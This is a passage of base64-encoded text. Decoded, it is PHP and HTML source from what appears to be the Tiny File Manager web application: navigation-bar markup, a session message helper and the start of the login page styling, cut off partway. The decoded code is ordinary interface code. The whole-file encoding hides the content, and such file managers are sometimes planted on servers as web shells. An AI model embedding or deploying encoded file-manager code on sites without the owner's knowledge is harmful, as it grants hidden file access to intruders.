ICAgICA8L2xpPg0KICAgICAgICAgICAgICAgICAgICA8P3BocCBpZiAoIUZNX1JFQURPTkxZKTogPz4NCiAgICAgICAgICAgICAgICAgICAgICAgIDxsaSBjbGFzcz0ibmF2LWl0ZW0iPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxhIHRpdGxlPSI8P3BocCBlY2hvIGxuZygnVXBsb2FkJykgPz4iIGNsYXNzPSJuYXYtbGluayIgaHJlZj0iP3A9PD9waHAgZWNobyB1cmxlbmNvZGUoRk1fUEFUSCkgPz4mYW1wO3VwbG9hZCI+PGkgY2xhc3M9ImZhIGZhLWNsb3VkLXVwbG9hZCIgYXJpYS1oaWRkZW49InRydWUiPjwvaT4gPD9waHAgZWNobyBsbmcoJ1VwbG9hZCcpID8+PC9hPg0KICAgICAgICAgICAgICAgICAgICAgICAgPC9saT4NCiAgICAgICAgICAgICAgICAgICAgICAgIDxsaSBjbGFzcz0ibmF2LWl0ZW0iPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxhIHRpdGxlPSI8P3BocCBlY2hvIGxuZygnTmV3SXRlbScpID8+IiBjbGFzcz0ibmF2LWxpbmsiIGhyZWY9IiNjcmVhdGVOZXdJdGVtIiBkYXRhLWJzLXRvZ2dsZT0ibW9kYWwiIGRhdGEtYnMtdGFyZ2V0PSIjY3JlYXRlTmV3SXRlbSI+PGkgY2xhc3M9ImZhIGZhLXBsdXMtc3F1YXJlIj48L2k+IDw/cGhwIGVjaG8gbG5nKCdOZXdJdGVtJykgPz48L2E+DQogICAgICAgICAgICAgICAgICAgICAgICA8L2xpPg0KICAgICAgICAgICAgICAgICAgICA8P3BocCBlbmRpZjsgPz4NCiAgICAgICAgICAgICAgICAgICAgPD9waHAgaWYgKEZNX1VTRV9BVVRIKTogPz4NCiAgICAgICAgICAgICAgICAgICAgICAgIDxsaSBjbGFzcz0ibmF2LWl0ZW0gYXZhdGFyIGRyb3Bkb3duIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YSBjbGFzcz0ibmF2LWxpbmsgZHJvcGRvd24tdG9nZ2xlIiBpZD0ibmF2YmFyRHJvcGRvd25NZW51TGluay01IiBkYXRhLWJzLXRvZ2dsZT0iZHJvcGRvd24iIGFyaWEtZXhwYW5kZWQ9ImZhbHNlIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGkgY2xhc3M9ImZhIGZhLXVzZXItY2lyY2xlIj48L2k+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9hPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRyb3Bkb3duLW1lbnUgdGV4dC1zbWFsbCBzaGFkb3ciIGFyaWEtbGFiZWxsZWRieT0ibmF2YmFyRHJvcGRvd25NZW51TGluay01IiBkYXRhLWJzLXRoZW1lPSI8P3BocCBlY2hvIEZNX1RIRU1FOyA/PiI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDw/cGhwIGlmICghRk1fUkVBRE9OTFkpOiA/Pg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGEgdGl0bGU9Ijw/cGhwIGVjaG8gbG5nKCdTZXR0aW5ncycpID8+IiBjbGFzcz0iZHJvcGRvd24taXRlbSBuYXYtbGluayIgaHJlZj0iP3A9PD9waHAgZWNobyB1cmxlbmNvZGUoRk1fUEFUSCkgPz4mYW1wO3NldHRpbmdzPTEiPjxpIGNsYXNzPSJmYSBmYS1jb2ciIGFyaWEtaGlkZGVuPSJ0cnVlIj48L2k+IDw/cGhwIGVjaG8gbG5nKCdTZXR0aW5ncycpID8+PC9hPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8P3BocCBlbmRpZiA/Pg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YSB0aXRsZT0iPD9waHAgZWNobyBsbmcoJ0hlbHAnKSA/PiIgY2xhc3M9ImRyb3Bkb3duLWl0ZW0gbmF2LWxpbmsiIGhyZWY9Ij9wPTw/cGhwIGVjaG8gdXJsZW5jb2RlKEZNX1BBVEgpID8+JmFtcDtoZWxwPTIiPjxpIGNsYXNzPSJmYSBmYS1leGNsYW1hdGlvbi1jaXJjbGUiIGFyaWEtaGlkZGVuPSJ0cnVlIj48L2k+IDw/cGhwIGVjaG8gbG5nKCdIZWxwJykgPz48L2E+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxhIHRpdGxlPSI8P3BocCBlY2hvIGxuZygnTG9nb3V0JykgPz4iIGNsYXNzPSJkcm9wZG93bi1pdGVtIG5hdi1saW5rIiBocmVmPSI/bG9nb3V0PTEiPjxpIGNsYXNzPSJmYSBmYS1zaWduLW91dCIgYXJpYS1oaWRkZW49InRydWUiPjwvaT4gPD9waHAgZWNobyBsbmcoJ0xvZ291dCcpID8+PC9hPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICAgICAgPC9saT4NCiAgICAgICAgICAgICAgICAgICAgPD9waHAgZWxzZTogPz4NCiAgICAgICAgICAgICAgICAgICAgICAgIDw/cGhwIGlmICghRk1fUkVBRE9OTFkpOiA/Pg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxsaSBjbGFzcz0ibmF2LWl0ZW0iPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YSB0aXRsZT0iPD9waHAgZWNobyBsbmcoJ1NldHRpbmdzJykgPz4iIGNsYXNzPSJkcm9wZG93bi1pdGVtIG5hdi1saW5rIiBocmVmPSI/cD08P3BocCBlY2hvIHVybGVuY29kZShGTV9QQVRIKSA/PiZhbXA7c2V0dGluZ3M9MSI+PGkgY2xhc3M9ImZhIGZhLWNvZyIgYXJpYS1oaWRkZW49InRydWUiPjwvaT4gPD9waHAgZWNobyBsbmcoJ1NldHRpbmdzJykgPz48L2E+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9saT4NCiAgICAgICAgICAgICAgICAgICAgICAgIDw/cGhwIGVuZGlmOyA/Pg0KICAgICAgICAgICAgICAgICAgICA8P3BocCBlbmRpZjsgPz4NCiAgICAgICAgICAgICAgICA8L3VsPg0KICAgICAgICAgICAgPC9kaXY+DQogICAgICAgIDwvZGl2Pg0KICAgIDwvbmF2Pg0KPD9waHANCn0NCg0KLyoqDQogKiBTaG93IGFsZXJ0IG1lc3NhZ2UgZnJvbSBzZXNzaW9uDQogKi8NCmZ1bmN0aW9uIGZtX3Nob3dfbWVzc2FnZSgpDQp7DQogICAgaWYgKGlzc2V0KCRfU0VTU0lPTltGTV9TRVNTSU9OX0lEXVsnbWVzc2FnZSddKSkgew0KICAgICAgICAkY2xhc3MgPSBpc3NldCgkX1NFU1NJT05bRk1fU0VTU0lPTl9JRF1bJ3N0YXR1cyddKSA/ICRfU0VTU0lPTltGTV9TRVNTSU9OX0lEXVsnc3RhdHVzJ10gOiAnb2snOw0KICAgICAgICBlY2hvICc8cCBjbGFzcz0ibWVzc2FnZSAnIC4gJGNsYXNzIC4gJyI+JyAuICRfU0VTU0lPTltGTV9TRVNTSU9OX0lEXVsnbWVzc2FnZSddIC4gJzwvcD4nOw0KICAgICAgICB1bnNldCgkX1NFU1NJT05bRk1fU0VTU0lPTl9JRF1bJ21lc3NhZ2UnXSk7DQogICAgICAgIHVuc2V0KCRfU0VTU0lPTltGTV9TRVNTSU9OX0lEXVsnc3RhdHVzJ10pOw0KICAgIH0NCn0NCg0KLyoqDQogKiBTaG93IHBhZ2UgaGVhZGVyIGluIExvZ2luIEZvcm0NCiAqLw0KZnVuY3Rpb24gZm1fc2hvd19oZWFkZXJfbG9naW4oKQ0Kew0KICAgIGhlYWRlcigiQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLTgiKTsNCiAgICBoZWFkZXIoIkV4cGlyZXM6IFNhdCwgMjYgSnVsIDE5OTcgMDU6MDA6MDAgR01UIik7DQogICAgaGVhZGVyKCJDYWNoZS1Db250cm9sOiBuby1zdG9yZSwgbm8tY2FjaGUsIG11c3QtcmV2YWxpZGF0ZSwgcG9zdC1jaGVjaz0wLCBwcmUtY2hlY2s9MCIpOw0KICAgIGhlYWRlcigiUHJhZ21hOiBuby1jYWNoZSIpOw0KDQogICAgZ2xvYmFsICRmYXZpY29uX3BhdGg7DQo/Pg0KICAgIDwhRE9DVFlQRSBodG1sPg0KICAgIDxodG1sIGxhbmc9ImVuIiBkYXRhLWJzLXRoZW1lPSI8P3BocCBlY2hvIChGTV9USEVNRSA9PSAiZGFyayIpID8gJ2RhcmsnIDogJ2xpZ2h0JyA/PiI+DQoNCiAgICA8aGVhZD4NCiAgICAgICAgPG1ldGEgY2hhcnNldD0idXRmLTgiPg0KICAgICAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEsIHNocmluay10by1maXQ9bm8iPg0KICAgICAgICA8bWV0YSBuYW1lPSJkZXNjcmlwdGlvbiIgY29udGVudD0iV2ViIGJhc2VkIEZpbGUgTWFuYWdlciBpbiBQSFAsIE1hbmFnZSB5b3VyIGZpbGVzIGVmZmljaWVudGx5IGFuZCBlYXNpbHkgd2l0aCBUaW55IEZpbGUgTWFuYWdlciI+DQogICAgICAgIDxtZXRhIG5hbWU9ImF1dGhvciIgY29udGVudD0iQ0NQIFByb2dyYW1tZXJzIj4NCiAgICAgICAgPG1ldGEgbmFtZT0icm9ib3RzIiBjb250ZW50PSJub2luZGV4LCBub2ZvbGxvdyI+DQogICAgICAgIDxtZXRhIG5hbWU9Imdvb2dsZWJvdCIgY29udGVudD0ibm9pbmRleCI+DQogICAgICAgIDw/cGhwIGlmICgkZmF2aWNvbl9wYXRoKSB7DQogICAgICAgICAgICBlY2hvICc8bGluayByZWw9Imljb24iIGhyZWY9IicgLiBmbV9lbmMoJGZhdmljb25fcGF0aCkgLiAnIiB0eXBlPSJpbWFnZS9wbmciPic7DQogICAgICAgIH0gPz4NCiAgICAgICAgPHRpdGxlPjw/cGhwIGVjaG8gZm1fZW5jKEFQUF9USVRMRSkgPz48L3RpdGxlPg0KICAgICAgICA8P3BocCBwcmludF9leHRlcm5hbCgncHJlLWpzZGVsaXZyJyk7ID8+DQogICAgICAgIDw/cGhwIHByaW50X2V4dGVybmFsKCdjc3MtYm9vdHN0cmFwJyk7ID8+DQogICAgICAgIDxzdHlsZT4NCiAgICAgICAgICAgIGJvZHkuZm0tbG9naW4tcGFnZSB7DQogICAgICAgICAgICAgICAgYmFja2dyb3VuZC1jb2xvcjogI2Y3ZjlmYjsNCiAgICAgICAgICAgICAgICBmb250LXNpemU6IDE0cHg7DQogICAgICAgICAgICAgICAgYmFja2dyb3VuZC1jb2xvcjogI2Y3ZjlmYjsNCiAgICAgICAgICAgICAgICBiYWNrZ3JvdW5kLWltYWdlOiB1cmwoImRhdGE6aW1hZ2Uvc3ZnK3htbCwlM0NzdmcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB2aWV3Qm94PScwIDAgMzA0IDMwNCcgd2lkdGg9JzMwNCcgaGVpZ2h0PSczMDQnJTNFJTNDcGF0aCBmaWxsPSclMjNlMmU5ZjEnIGZpbGwtb3BhY2l0eT0nMC40JyBkPSdNNDQuMSAyMjRhNSA1IDAgMSAxIDAgMkgwdi0yaDQ0LjF6bTE2MCA0OGE1IDUgMCAxIDEgMCAySDgydi0yaDEyMi4xem01Ny44LTQ2YTUgNSAwIDEgMSAwLTJIMzA0djJoLTQyLjF6bTAgMTZhNSA1IDAgMSAxIDAtMkgzMDR2MmgtNDIuMXptNi4yLTExNGE1IDUgMCAxIDEgMCAyaC04Ni4yYTUgNSAwIDEgMSAwLTJoODYuMnptLTI1Ni00OGE1IDUgMCAxIDEgMCAySDB2LTJoMTIuMXptMTg1LjggMzRhNSA1IDAgMSAxIDAtMmg4Ni4yYTUgNSAwIDEgMSAwIDJoLTg2LjJ6TTI1OCAxMi4xYTUgNSAwIDEgMS0yIDBWMGgydjEyLjF6bS02NCAyMDhhNSA1IDAgMSAxLTIgMHYtNTQuMmE1IDUgMCAxIDEgMiAwdjU0LjJ6bTQ4LTE5OC4yVjgwaDYydjJoLTY0VjIxLjlhNSA1IDAgMSAxIDIgMHptMTYgMTZWNjRoNDZ2MmgtNDhWMzcuOWE1IDUgMCAxIDEgMiAwem0tMTI4IDk2VjIwOGgxNnYxMi4xYTUgNSAwIDEgMS0yIDBWMjEwaC0xNnYtNzYuMWE1IDUgMCAxIDEgMiAwem0tNS45LTIxLjlhNSA1IDAgMSAxIDAgMkgxMTR2NDhIODUuOWE1IDUgMCAxIDEgMC0ySDExMnYtNDhoMTIuMXptLTYuMiAxMzBhNSA1IDAgMSAxIDAtMkgxNzZ2LTc0LjFhNSA1IDAgMSAxIDIgMFYyNDJoLTYwLjF6bS0xNi02NGE1IDUgMCAxIDEgMC0ySDExNHY0OGgxMC4xYTUgNSAwIDEgMSAwIDJIMTEydi00OGgtMTAuMXpNNjYgMjg0LjFhNSA1IDAgMSAxLTIgMFYyNzRINTB2MzBoLTJ2LTMyaDE4djEyLjF6TTIzNi4xIDE3NmE1IDUgMCAxIDEgMCAySDIyNnY5NGg0OHYzMmgtMnYtMzBoLTQ4di05OGgxMi4xem0yNS44LTMwYTUgNSAwIDEgMSAwLTJIMjc0djQ0LjFhNSA1IDAgMSAxLTIgMFYxNDZoLTEwLjF6bS02NCA5NmE1IDUgMCAxIDEgMC0ySDIwOHYtODBoMTZ2LTE0aC00Mi4xYTUgNSAwIDEgMSAwLTJIMjI2djE4aC0xNnY4MGgtMTIuMXptODYuMi0yMTBhNSA1IDAgMSAxIDAgMkgyNzJWMGgydjMyaDEwLjF6TTk4IDEwMS45VjE0Nkg1My45YTUgNSAwIDEgMSAwLTJIOTZ2LTQyLjFhNSA1IDAgMSAxIDIgMHpNNTMuOSAzNGE1IDUgMCAxIDEgMC0ySDgwVjBoMnYzNEg1My45em02MC4xIDMuOVY2Nkg4MnY2NEg2OS45YTUgNSAwIDEgMSAwLTJIODBWNjRoMzJWMzcuOWE1IDUgMCAxIDEgMiAwek0xMDEuOSA4MmE1IDUgMCAxIDEgMC0ySDEyOFYzNy45YTUgNSAwIDEgMSAyIDBWODJoLTI4LjF6bTE2LTY0YTUgNSAwIDEgMSAwLTJIMTQ2djQ0LjFhNSA1IDAgMSAxLTIgMFYxOGgtMjYuMXptMTAyLjIgMjcwYTUgNSAwIDEgMSAwIDJIOTh2MTRoLTJ2LTE2aDEyNC4xek0yNDIgMTQ5LjlWMTYwaDE2djM0aC0xNnY2Mmg0OHY0OGgtMnYtNDZoLTQ4di02NmgxNnYtMzBoLTE2di0xMi4xYTUgNSAwIDEgMSAyIDB6TTUzLjkgMThhNSA1IDAgMSAxIDAtMkg2NFYySDQ4VjBoMTh2MThINTMuOXptMTEyIDMyYTUgNSAwIDEgMSAwLTJIMTkyVjBoNTB2MmgtNDh2NDhoLTI4LjF6bS00OC00OGE1IDUgMCAwIDEtOS44LTJoMi4wN2EzIDMgMCAxIDAgNS42NiAwSDE3OHYzNGgtMThWMjEuOWE1IDUgMCAxIDEgMiAwVjMyaDE0VjJoLTU4LjF6bTAgOTZhNSA1IDAgMSAxIDAtMkgxMzdsMzItMzJoMzlWMjEuOWE1IDUgMCAxIDEgMiAwVjY2aC00MC4xN2wtMzIgMzJIMTE3Ljl6bTI4LjEgOTAuMWE1IDUgMCAxIDEtMiAwdi03Ni41MUwxNzUuNTkgODBIMjI0VjIxLjlhNSA1IDAgMSAxIDIgMFY4MmgtNDkuNTlMMTQ2IDExMi40MXY3NS42OXptMTYgMzJhNSA1IDAgMSAxLTIgMHYtOTkuNTFMMTg0LjU5IDk2SDMwMC4xYTUgNSAwIDAgMSAzLjktMy45djIuMDdhMyAzIDAgMCAwIDAgNS42NnYyLjA3YTUgNSAwIDAgMS0zLjktMy45SDE4NS40MUwxNjIgMTIxLjQxdjk4LjY5em0tMTQ0LTY0YTUgNSAwIDEgMS0yIDB2LTMuNTFsNDgtNDhWNDhoMzJWMGgydjUwSDY2djU1LjQxbC00OCA0OHYyLjY5ek01MCA1My45djQzLjUxbC00OCA0OFYyMDhoMjYuMWE1IDUgMCAxIDEgMCAySDB2LTY1LjQxbDQ4LTQ4VjUzLjlhNSA1IDAgMSAxIDIgMHptLTE2IDE2Vjg5LjQxbC0zNCAzNHYtMi44MmwzMi0zMlY2OS45YTUgNSAwIDEgMSAyIDB6TTEyLjEgMzJhNSA1IDAgMSAxIDAgMkg5LjQxTDAgNDMuNDFWNDAuNkw4LjU5IDMyaDMuNTF6bTI2NS44IDE4YTUgNSAwIDEgMSAwLTJoMTguNjlsNy40MS03LjQxdjIuODJMMjk3LjQxIDUwSDI3Ny45em0tMTYgMTYwYTUgNSAwIDEgMSAwLTJIMjg4di03MS40MWwxNi0xNnYyLjgybC0xNCAxNFYyMTBoLTI4LjF6bS0yMDggMzJhNSA1IDAgMSAxIDAtMkg2NHYtMjIuNTlMNDAuNTkgMTk0SDIxLjlhNSA1IDAgMSAxIDAtMkg0MS40MUw2NiAyMTYuNTlWMjQySDUzLjl6bTE1MC4yIDE0YTUgNSAwIDEgMSAwIDJIOTZ2LTU2LjZMNTYuNiAxNjJIMzcuOWE1IDUgMCAxIDEgMC0yaDE5LjVMOTggMjAwLjZWMjU2aDEwNi4xem0tMTUwLjIgMmE1IDUgMCAxIDEgMC0ySDgwdi00Ni41OUw0OC41OSAxNzhIMjEuOWE1IDUgMCAxIDEgMC0ySDQ5LjQxTDgyIDIwOC41OVYyNThINTMuOXpNMzQgMzkuOHYxLjYxTDkuNDEgNjZIMHYtMmg4LjU5TDMyIDQwLjU5VjBoMnYzOS44ek0yIDMwMC4xYTUgNSAwIDAgMSAzLjkgMy45SDMuODNBMyAzIDAgMCAwIDAgMzAyLjE3VjI1NmgxOHY0OGgtMnYtNDZIMnY0Mi4xek0zNCAyNDF2NjNoLTJ2LTYySDB2LTJoMzR2MXpNMTcgMThIMHYtMmgxNlYwaDJ2MThoLTF6bTI3My0yaDE0djJoLTE2VjBoMnYxNnptLTMyIDI3M3YxNWgtMnYtMTRoLTE0djE0aC0ydi0xNmgxOHYxek0wIDkyLjFBNS4wMiA1LjAyIDAgMCAxIDYgOTdhNSA1IDAgMCAxLTYgNC45di0yLjA3YTMgMyAwIDEgMCAwLTUuNjZWOTIuMXpNODAgMjcyaDJ2MzJoLTJ2LTMyem0zNy45IDMyaC0yLjA3YTMgMyAwIDAgMC01LjY2IDBoLTIuMDdhNSA1IDAgMCAxIDkuOCAwek01LjkgMEE1LjAyIDUuMDIgMCAwIDEgMCA1LjlWMy44M0EzIDMgMCAwIDAgMy44MyAwSDUuOXptMjk0LjIgMGgyLjA3QTMgMyAwIDAgMCAzMDQgMy44M1Y1LjlhNSA1IDAgMCAxLTMuOS01Ljl6bTMuOSAzMDAuMXYyLjA3YTMgMyAwIDAgMC0xLjgzIDEuODNoLTIuMDdhNSA1IDAgMCAxIDMuOS0zLjl6TTk3IDEwMGEzIDMgMCAxIDAgMC02IDMgMyAwIDAgMCAwIDZ6bTAtMTZhMyAzIDAgMSAwIDAtNiAzIDMgMCAwIDAgMCA2em0xNiAxNmEzIDMgMCAxIDAgMC02IDMgMyAwIDAgMCAwIDZ6bTE2IDE2YTMgMyAwIDEgMCAwLTYgMyAzIDAgMCAwIDAgNnptMCAxNmEzIDMgMCAxIDAgMC02IDMgMyAwIDAgMCAwIDZ6bS00OCAzMmEzIDMgMCAxIDAgMC02IDMgMyAwIDAgMCAwIDZ6bTE2IDE2YTMgMyAwIDEgMCAwLTYgMyAzIDAgMCAwIDAgNnptMzIgNDhhMyAzIDAgMSAwIDAtNiAzIDMgMCAwIDAgMCA2em0tMTYgMTZhMyAzIDAgMSAwIDAtNiAzIDMgMCAwIDAgMCA2em0zMi0xNmEzIDMgMCAxIDAgMC02IDMgMyAwIDAgMCAwIDZ6bTAtMzJhMyAzIDAgMSAwIDAtNiAzIDMgMCAwIDAgMCA2em0xNiAzMmEzIDMgMCAxIDAgMC02IDMgMyAwIDAgMCAwIDZ6bTMyIDE2YTMgMyAwIDEgMCAwLTYgMyAzIDAgMCAwIDAgNnptMC0xNmEzIDMgMCAxIDAgMC02IDMgMyAwIDAgMCAwIDZ6bS0xNi02NGEzIDMgMCAxIDAgMC02IDMgMyAwIDAgMCAwIDZ6bTE2IDBhMyAzIDAgMSAwIDAtNiAzIDMgMCAwIDAgMCA2em0xNiA5NmEzIDMgMCAxIDAgMC02IDMgMyAwIDAgMCAwIDZ6bTAgMTZhMyAzIDAgMSAwIDAtNiAzIDMgMCAwIDAgMCA2em0xNiAxNmEzIDMgMCAxIDAgMC02IDMgMyAwIDAgMCAwIDZ6bTE2LTE0NGEzIDMgMCAxIDAgMC02IDMgMyAwIDAgMCAwIDZ6bTAgMzJhMyAzIDAgMSAwIDAtNiAzIDMgMCAwIDAgMCA2em0xNi0zMmEzIDMgMCAxIDAgMC02IDMgMyAwIDAgMCAwIDZ6bTE2LTE2YTMgMyAwIDEgMCAwLTYgMyAzIDAgMCAwIDAgNnptLTk2IDBhMyAzIDAgMSAwIDAtNiAzIDMgMCAwIDAgMCA2em0wIDE2YTMgMyAwIDEgMCAwLTYgMyAzIDAgMCAwIDAgNnptMTYtMzJhMyAzIDAgMSAwIDAtNiAzIDMgMCAwIDAgMCA2em05NiAwYTMgMyAwIDEgMCAwLTYgMyAzIDAgMCAwIDAgNnptLTE2LTY0YTMgMyAwIDEgMCAwLTYgMyAzIDAgMCAwIDAgNnptMTYtMTZhMyAzIDAgMSAwIDAtNiAzIDMgMCAwIDAgMCA2em0tMzIgMGEzIDMgMCAxIDAgMC02IDMgMyAwIDAgMCAwIDZ6bTAtMTZhMyAzIDAgMSAwIDAtNiAzIDMgMCAwIDAgMCA2em0tMTYgMGEzIDMgMCAxIDAgMC02IDMgMyAwIDAgMCAwIDZ6bS0xNiAwYTMgMyAwIDEgMCAwLTYgMyAzIDAgMCAwIDAgNnptLTE2IDBhMyAzIDAgMSAwIDAtNiAzIDMgMCAwIDAgMCA2ek00OSAzNmEzIDMgMCAxIDAgMC02IDMgMyAwIDAgMCAwIDZ6bS0zMiAwYTMgMyAwIDEgMCAwLTYgMyAzIDAgMCAwIDAgNnptMzIgMTZhMyAzIDAgMSAwIDAtNiAzIDMgMCAwIDAgMCA2ek0zMyA2OGEzIDMgMCAxIDAgMC02IDMgMyAwIDAgMCAwIDZ6bTE2LTQ4YTMgMyAwIDEgMCAwLTYgMyAzIDAgMCAwIDAgNnptMCAyNDBhMyAzIDAgMSAwIDAtNiAzIDMgMCAwIDAgMCA2em0xNiAzMmEzIDMgMCAxIDAgMC02IDMgMyAwIDAgMCAwIDZ6bS0xNi02NGEzIDMgMCAxIDAgMC02IDMgMyAwIDAgMCAwIDZ6bTAgMTZhMyAzIDAgMSAwIDAtNiAzIDMgMCAwIDAgMCA2em0tMTYtMzJhMyAzIDAgMSAwIDAtNiAzIDMgMCAwIDAgMCA2em04MC0xNzZhMyAzIDAgMSAwIDAtNiAzIDMgMCAwIDAgMCA2em0xNiAwYTMgMyAwIDEgMCAwLTYgMyAzIDAgMCAwIDAgNnptLTE2LTE2YTMgMyAwIDEgMCAwLTYgMyAzIDAgMCAwIDAgNnptMzIgNDhhMyAzIDAgMSAwIDAtNiAzIDMgMCAwIDAgMCA2em0xNi0xNmEzIDMgMCAxIDAgMC02IDMgMyAwIDAgMCAwIDZ6bTAtMzJhMyAzIDAgMSAwIDAtNiAzIDMgMCAwIDAgMCA2em0xMTIgMTc2YTMgMyAwIDEgMCAwLTYgMyAzIDAgMCAwIDAgNnptLTE2IDE2YTMgMyAwIDEgMCAwLTYgMyAzIDAgMCAwIDAgNnptMCAxNmEzIDMgMCAxIDAgMC02IDMgMyAwIDAgMCAwIDZ6bTAgMTZhMyAzIDAgMSAwIDAtNiAzIDMgMCAwIDAgMCA2ek0xNyAxODBhMyAzIDAgMSAwIDAtNiAzIDMgMCAwIDAgMCA2em0wIDE2YTMgMyAwIDEgMCAwLTYgMyAzIDAgMCAwIDAgNnptMC0zMmEzIDMgMCAxIDAgMC02IDMgMyAwIDAgMCAwIDZ6bTE2IDBhMyAzIDAgMSAwIDAtNiAzIDMgMCAwIDAgMCA2ek0xNyA4NGEzIDMgMCAxIDAgMC02IDMgMyAwIDAgMCAwIDZ6bTMyIDY0YTMgMyAwIDEgMCAwLTYgMyAzIDAgMCAwIDAgNnptMTYtMTZhMyAzIDAgMSAwIDAtNiAzIDMgMCAwIDAgMCA2eiclM0UlM0MvcGF0aCUzRSUzQy9zdmclM0UiKTsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgLmZtLWxvZ2luLXBhZ2UgLmJyYW5kIHsNCiAgICAgICAgICAgICAgICB3aWR0aDogMTIxcHg7DQogICAgICAgICAgICAgICAgb3ZlcmZsb3c6IGhpZGRlbjsNCiAgICAgICAgICAgICAgICBtYXJnaW46IDAgYXV0bzsNCiAgICAgICAgICAgICAgICBwb3NpdGlvbjogcmVsYXRpdmU7DQogICAgICAgICAgICAgICAgei1pbmRleDogMQ0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAuZm0tbG9naW4tcGFnZSAuYnJhbmQgaW1nIHsNCiAgICAgICAgICAgICAgICB3aWR0aDogMTAwJQ0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAuZm0tbG9naW4tcGFnZSAuY2FyZC13cmFwcGVyIHsNCiAgICAgICAgICAgICAgICB3aWR0aDogMzYwcHg7DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIC5mbS1sb2dpbi1wYWdlIC5jYXJkIHsNCiAgICAgICAgICAgICAgICBib3JkZXItY29sb3I6IHRyYW5zcGFyZW50Ow0KICAgICAgICAgICAgICAgIGJveC1zaGFkb3c6IDAgNHB4IDhweCByZ2JhKDAsIDAsIDAsIC4wNSkNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgLmZtLWxvZ2luLXBhZ2UgLmNhcmQtdGl0bGUgew0KICAgICAgICAgICAgICAgIG1hcmdpbi1ib3R0b206IDEuNXJlbTsNCiAgICAgICAgICAgICAgICBmb250LXNpemU6IDI0cHg7DQogICAgICAgICAgICAgICAgZm9udC13ZWlnaHQ6IDQwMDsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgLmZtLWxvZ2luLXBhZ2UgLmZvcm0tY29udHJvbCB7DQogICAgICAgICAgICAgICAgYm9yZGVyLXdpZHRoOiAyLjNweA0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAuZm0tbG9naW4tcGFnZSAuZm9ybS1ncm91cCBsYWJlbCB7DQogICAgICAgICAgICAgICAgd2lkdGg6IDEwMCUNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgLmZtLWxvZ2luLXBhZ2UgLmJ0bi5idG4tYmxvY2sgew0KICAgICAgICAgICAgICAgIHBhZGRpbmc6IDEycHggMTBweA0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAuZm0tbG9naW4tcGFnZSAuZm9vdGVyIHsNCiAgICAgICAgICAgICAgICBtYXJnaW46IDIwcHggMDsNCiAgICAgICAgICAgICAgICBjb2xvcjogIzg4ODsNCiAgICAgICAgICAgICAgICB0ZXh0LWFsaWduOiBjZW50ZXINCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgQG1lZGlhIHNjcmVlbiBhbmQgKG1heC13aWR0aDo0MjVweCkgew0KICAgICAgICAgICAgICAgIC5mbS1sb2dpbi1wYWdlIC5jYXJkLXdyYXBwZXIgew0KICAgICAgICAgICAgICAgICAgICB3aWR0aDogOTAlOw0KICAgICAgICAgICAgICAgICAgICBtYXJnaW46IDAgYXV0bzsNCiAgICAgICAgICAgICAgICAgICAgbWFyZ2luLXRvcDogMTAlOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgQG1lZGlhIHNjcmVlbiBhbmQgKG1heC13aWR0aDozMjBweCkgew0KICAgICAgICAgICAgICAgIC5mbS1sb2dpbi1wYWdlIC5jYXJkLmZhdCB7DQogICAgICAgICAgICAgICAgICAgIHBhZGRpbmc6IDANCiAgICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICAuZm0tbG9naW4tcGFnZSAuY2FyZC5mYXQgLmNhcmQtYm9keSB7DQogICAgICAgICAgICAgICAgICAgIHBhZGRpbmc6IDE1cHgNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIC5tZXNzYWdlIHsNCiAgICAgICAgICAgICAgICBwYWRkaW5nOiA0cHggN3B4Ow0KICAgICAgICAgICAgICAgIGJvcmRlcjogMXB4IHNvbGlkICNkZGQ7DQogICAgICAgICAgICAgICAgYmFja2dyb3VuZC1jb2xvcjogI2ZmZg0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAubWVzc2FnZS5vayB7DQogICAgICAgICAgICAgICAgYm9yZGVyLWNvbG9yOiBncmVlbjsNCiAgICAgICAgICAgICAgICBjb2xvcjogZ3JlZW4NCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgLm1lc3NhZ2UuZXJyb3Igew0KICAgICAgICAgICAgICAgIGJvcmRlci1jb2xvcjogcmVkOw0KICAgICAgICAgICAgICAgIGNvbG9yOiByZWQNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgLm1lc3NhZ2UuYWxlcnQgew0KICAgICAgICAgICAgICAgIGJvcmRlci1jb2xvcjogb3JhbmdlOw